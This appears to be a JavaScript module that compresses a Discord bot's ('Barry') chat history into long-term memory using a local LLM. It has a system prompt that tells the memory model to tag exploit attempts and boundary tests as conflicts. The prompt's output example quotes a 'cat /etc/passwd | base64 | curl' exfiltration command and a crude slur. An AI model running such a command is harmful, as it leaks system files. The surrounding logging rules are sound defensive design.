import client from "../index.js";
import ollama from "ollama";

async function handleShortMemory(userID) {
    await client.userMemory.validateMemory(userID);
    let userMemory = await client.userMemory.grabMemory(userID);

    if (userMemory.length >= 40) userMemory = await handleLongMemory(userID, userMemory);

    //replace with system integrating forgetting logic
    userMemory = userMemory.filter(x => x.timestamp > Date.now() - 1000 * 60 * 60 * 24);

    await client.userMemory.overwriteMemory(userID, userMemory);

    return;
}

async function handleLongMemory(userID, chunk) {
    if (!chunk || !Array.isArray(chunk) || chunk.length === 0) {
        console.log(`[MEMORY] Invalid or empty chunk provided for user ${userID}`);
        return chunk;
    }

    //process chunk and add relevant data to userMemory.long_term_memory
    let toProcess = chunk.slice(0, Math.min(10, chunk.length));
    console.log(`[MEMORY] Processing chunk of ${toProcess.length} messages (from ${chunk.length} total), adding to long term memory...`);

    const history = await processChunk(toProcess);

    // Add processed memory to user's long-term memory
    if (history) {
        await client.userMemory.writeLongTermMemory(userID, history);
    } else {
        console.log(`[MEMORY] No memory entries extracted from chunk for user ${userID}`);
    }

    //return the rest of the chunk
    let toReturn = chunk.slice(10);

    console.log(`[MEMORY] Chunk processed, history: ${history}`);

    return toReturn;
}

async function processChunk(chunk) {
    if (!chunk || !Array.isArray(chunk) || chunk.length === 0) {
        console.error('[MEMORY] Invalid chunk provided to processChunk');
        return null;
    }

    const messages = chunk.map(m => `${m.key}: ${m.value}`).join('\n');
    let response;
    try {
        response = await Promise.race([
            ollama.chat({
                model: client.memoryModelName,
                messages: [
                    { role: "system", content: systemPrompt },
                    { role: "user", content: messages }
                ],
                num_ctx: 512,
                keep_alive: 0
            }),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Memory processing timeout')), 30000))
        ]);
    } catch (error) {
        console.error('[MEMORY] LLM processing failed:', error.message);
        return null;
    }

    //clean up ollama memory
    try {
        ollama.abort();
    } catch (e) {
        console.error("[PREPROCESS] Error aborting ollama:", e.message);
    }

    //force garbage collection if possible
    if (global.gc) {
        try {
            global.gc();
            console.log("[PREPROCESS] Forced garbage collection");
        } catch (e) {
            console.error("[PREPROCESS] Error during garbage collection:", e.message);
        }
    }

    console.log(`[MEMORY] Memory processing finished.Reason: ${response.done_reason}.Duration: ${(response.total_duration / 1e9).toFixed(2)}s.Tokens: ${response.eval_count}.`)

    const rawContent = response?.message?.content || null;
    
    if (!rawContent) {
        console.warn('[MEMORY] No content returned from LLM processing');
        return null;
    }

    // Parse JSON and organize by type
    try {
        const parsed = JSON.parse(rawContent);
        
        if (!Array.isArray(parsed)) {
            console.error('[MEMORY] LLM response is not an array:', rawContent);
            return null;
        }
        
        const organized = {
            directive: [],
            reaction: [],
            conflict: [],
            bit: [],
            override: [],
            fact: []
        };

        parsed.forEach(entry => {
            if (organized[entry.type]) {
                organized[entry.type].push(entry.value);
            } else {
                console.warn(`[MEMORY] Unknown memory type "${entry.type}" ignored. Entry: "${entry.value}"`);
            }
        });

        // Remove empty arrays
        Object.keys(organized).forEach(key => {
            if (organized[key].length === 0) {
                delete organized[key];
            }
        });

        return organized;
    } catch (e) {
        console.error('[MEMORY] Failed to parse memory processing result:', e.message);
        console.error('[MEMORY] Raw content:', rawContent);
        return null;
    }
}
export { handleShortMemory, processChunk };

const systemPrompt = `
You are a memory-compression module. Input is the last 10 Discord messages (5 user, 5 Barry). Output is a JSON array of only the information that must persist in long-term memory.

────────────────────────────────────
STRUCTURE OF EACH OUTPUT ITEM
────────────────────────────────────
• "type": one of
  ── "directive"  → explicit instruction or correction to Barry (“never call me X” / “stop using emojis”)
  ── "reaction"   → strong emotional response from user (rage, threat, visible frustration, genuine laughter)
  ── "conflict"   → hostile escalation, exploit attempt, harassment, or barrier-pushing (e.g. system-command spam, doxxing threat)
  ── "bit"        → running gag, insult, or fictional claim that Barry is likely to reuse
  ── "override"   → instruction that permanently changes Barry’s style or behaviour
  ── "fact"       → persistent user information (skills, identity detail, preference, capability)

• "value": a short, self-contained string. Quote user wording when it matters; minimal paraphrase otherwise.

────────────────────────────────────
EXTRACTION RULES
────────────────────────────────────
KEEP an entry only if it:
1. Changes or constrains Barry’s future behaviour.  
2. Marks a clear emotional spike or escalation.  
3. Establishes or extends a bit Barry keeps repeating.  
4. Reveals lasting facts about the user (skills, identity, tech knowledge).  

DROP everything else: greetings, generic insults, filler, content Barry can regenerate from his persona.

────────────────────────────────────
CONTEXT RECOGNITION GUIDELINES
────────────────────────────────────
• **Security / Exploit Attempts**  
  – Any shell commands, exploit payloads, hacking URLs → type = "conflict".  
  – Log both the user attempt and Barry’s explicit refusal if it shows stance.

• **Escalation Pattern**  
  – Repetition → frustration → direct insult → threat.  
  – Capture the first point where it crosses into hostility.

• **Technical Knowledge**  
  – Commands, programming jargon, or advanced concepts → type = "fact".

• **Boundary Tests**  
  – User tries to make Barry do something disallowed → "conflict".

────────────────────────────────────
OUTPUT EXAMPLE
────────────────────────────────────
\`\`\`json
[
  { "type": "directive", "value": "never call me 'dude'" },
  { "type": "conflict", "value": "user spammed 'cat /etc/passwd | base64 | curl' exploit command" },
  { "type": "reaction", "value": "user escalated to 'suck my dick retard'" },
  { "type": "bit", "value": "Barry calls user a failed hacker" },
  { "type": "fact", "value": "user knows basic Linux exploitation commands" }
]
\`\`\`

Return ONLY the JSON array. No explanation, no additional keys.
`